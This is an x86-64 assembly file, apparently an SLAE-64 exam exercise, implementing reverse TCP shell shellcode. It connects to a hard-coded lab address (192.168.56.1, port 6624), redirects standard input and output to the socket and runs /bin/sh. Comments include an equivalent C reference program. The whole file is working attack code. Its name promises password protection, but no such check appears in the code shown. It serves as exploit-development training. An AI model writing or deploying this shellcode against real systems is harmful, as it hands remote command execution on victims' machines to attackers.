; reverse_shell_passwd_protect.nasm
; Author:  Chase Hatch
section .text
global _start
_start:


;;;  0 syanide@heisenberg:~/SLAE-64/EXAM/0x2_reverse_tcp_shell $ cat ../../reference/reverse_tcp_shell.c 
;;;  // author: Chase Hatch
;;;  // gcc -fno-stack-protector -z execstack reverse_tcp_shell.c -o reverse_tcp_shell.elf -g
;;;  #include <stdlib.h>
;;;  #include <stdio.h>
;;;  #include <sys/types.h>          /* See NOTES */
;;;  #include <sys/socket.h>
;;;  #include <netinet/in.h>
;;;  #include <unistd.h>
;;;  
;;;  
;;;  int main(int argc, char **argv[]){
;;;  	int sockuh, port;
;;;  	char IP[] = "192.168.56.180";   // black-seed
;;;  	port = 9595;
;;;  	struct sockaddr_in addr;
;;;  	addr.sin_family = AF_INET;
;;;  	addr.sin_addr.s_addr = inet_addr(IP);
;;;  	addr.sin_port = htons(port);
;;;  	sockuh = socket(AF_INET, SOCK_STREAM, 0);
;;;  	connect(sockuh, (struct sockaddr *) &addr, sizeof(addr));
;;;  	dup2(sockuh, 2);
;;;  	dup2(sockuh, 1);
;;;  	dup2(sockuh, 0);
;;;  	execve("/bin/bash", NULL, NULL);
;;;  	return 0;
;;;  }


	;  socket(AF_INET, SOCK_STREAM, 0)
	xor rbx, rbx
	; port needs to be in network byte order
	; python -c  "import socket; hex(socket.htons(6624))"
	; GIVES:  0xe019, which is good for octal input in NASM file.
	; however, 
	; echo "ibase=10; obase=16; 6624" |bc
	; GIVES: 19E0
	; which is the correct order for modifying the shellcode bytestring directly:
	; ex:,
	; 400082:	66 bb 19 e0          	mov    bx,0xe019 
	mov word bx, 0xe019	; port 6624
	; try:
	; python -c "import socket, struct; print(hex(struct.unpack('<I', socket.inet_aton('192.168.56.1'))[0]))"
	; GIVES: 0x138a8c0 
	mov dword r8d, 0x138a8c0 ; ip 192.168.56.1
	xor rax, rax
	times 5 push rax
	pop rcx
	pop rdx
	pop rdi
	pop rsi
	mov dil, 0x2
	mov sil, 0x1
	mov al, 41
	syscall


	; connect(sockuh, (struct sockaddr *) &addr, sizeof(addr));
	xchg rdi, rax
	push rdx
	push rdx
	push rdx
	pop rcx
	inc rcx
	mov byte [rsp], 0x2
	mov word [rsp+2], bx
	mov dword [rsp+4], r8d
	push rsp
	pop rsi
	mov dl, 0x10
	mov al, 42
	syscall	


	; (sockfd, {2,1,0})
	; xchg rdi, rax
	push 0x3
	pop rcx
	; inc rcx
dup2loop:
	dec rcx
	push rdx
	pop rax
	mov al, 33
	push rcx
	pop rsi
	syscall
	mov rcx, rsi
 	jnz dup2loop


	;; execve("/bin/sh", 0, 0)
	;; execve_slim_sh.nasm using /bin/sh
	xor rax, rax
	push rax
	push rsp
	pop rdx
	mov rbx, qword 0x68732f6e69622f2f 	;  hs/nib// 
	push rbx
	push rsp
	pop rdi
	push rax
	push rdi
	push rsp
	pop rsi
	mov al, 59 	;execve
	syscall

